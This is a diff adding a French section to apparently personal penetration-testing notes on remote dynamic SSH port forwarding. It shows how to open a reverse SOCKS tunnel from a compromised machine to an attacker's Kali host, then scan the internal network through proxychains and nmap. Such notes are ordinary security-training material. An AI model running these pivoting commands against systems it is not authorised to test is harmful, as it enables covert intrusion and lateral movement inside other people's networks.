@@ -141,3 +141,41 @@ ss -ntplu | grep 2345
 ```bash
 psql -h 127.0.0.1 -p 2345 -U postgres
 ```
+
+## Remote Dynamic Port Forwarding
+
+Combine les avantages du remote forwarding (connexion sortante depuis la machine compromise) et du dynamic forwarding (proxy SOCKS multi-cibles). Le port SOCKS s'ouvre sur **Kali**, le trafic est forwardé par la machine compromise.
+
+> Disponible depuis OpenSSH 7.6 (octobre 2017) — uniquement le client doit être ≥ 7.6, pas le serveur.
+
+```bash
+ssh -N -R REMOTE_PORT user@kali
+```
+
+> Seul le port est spécifié (pas de destination) — le proxy SOCKS s'ouvre sur le loopback de Kali.
+
+### Ouvrir le tunnel depuis la machine compromise
+
+```bash
+# Lier le proxy SOCKS sur 127.0.0.1:9998 côté Kali
+ssh -N -R 9998 kali@<IP_KALI>
+```
+
+**Vérifier côté Kali**
+
+```bash
+sudo ss -ntplu | grep 9998
+```
+
+### Configurer Proxychains et utiliser le tunnel
+
+Mettre à jour `/etc/proxychains4.conf` :
+
+```
+socks5 127.0.0.1 9998
+```
+
+```bash
+# Scan Nmap via le proxy SOCKS
+proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
+```
